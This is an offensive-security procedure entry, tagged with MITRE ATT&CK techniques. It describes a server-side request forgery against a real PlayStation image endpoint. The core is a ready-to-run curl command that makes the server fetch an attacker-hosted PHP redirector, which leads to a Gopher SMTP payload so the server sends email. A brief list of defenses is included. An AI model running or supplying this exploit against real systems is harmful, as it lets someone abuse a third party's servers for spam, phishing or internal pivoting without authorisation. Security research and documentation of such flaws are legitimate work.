---
tags:
  - ssrf
  - http
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/http-get-playstation-image-ssrf]]'
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.609Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: e84dec7b-ae58-46f6-9e9b-fd29c5fdad21
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-SSRF-in-PlayStation-Image-Endpoint

## Summary

This procedure exploits an SSRF vulnerability in the PlayStation image rendering endpoint by supplying an arbitrary external URL in the 'image' parameter, causing the server to fetch and follow a redirect to execute a Gopher-based SMTP payload.

## Description

The endpoint at image.api.np.km.playstation.net/images/ accepts a 'image' parameter without validation, allowing attackers to specify external URLs. By pointing it to a PHP redirector that leads to a Gopher URL with SMTP commands, the backend server (hosted on AWS EC2) performs the fetch, follows the redirect, and inadvertently sends an email. This demonstrates server abuse for outbound requests, with potential for spam, phishing, or internal pivoting. The attack relies on the server's redirect-following behavior and lack of protocol restrictions.

## Requirements

1. Public access to https://image.api.np.km.playstation.net
2. Hosted PHP redirector from prior procedure
3. Tool like curl for sending HTTP requests
4. Knowledge of URL encoding for the 'image' parameter

## Defense

Defensive measures and detection strategies:

- Validate and allowlist URLs in the 'image' parameter to trusted domains only
- Block outbound requests to non-standard protocols (e.g., Gopher) using network proxies or firewalls
- Log and monitor all resource fetches from the endpoint, alerting on redirects or port 25 connections
- Implement response size limits and timeout enforcement to prevent abuse

## Objectives

1. Force the vulnerable endpoint to fetch attacker-controlled content
2. Chain redirect to execute protocol-specific payload for server-side actions
3. Confirm SSRF success through side effects like email delivery

## Instructions

### Step 1: Craft Malicious URL

**Context**: URL-encode the attacker PHP URL and append to the endpoint with format=png.

**Command** ([[commands/http-get-playstation-image-ssrf]]):
```bash
curl -X GET "https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Connection: close" \
  -H "Upgrade-Insecure-Requests: 1"
```

> This sends the request, triggering the SSRF. Expected output: 404 Not Found, but server performs the fetch and SMTP send.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/http-get-playstation-image-ssrf]]

## Tools Used


## Tags

- ssrf
- http
- exploit
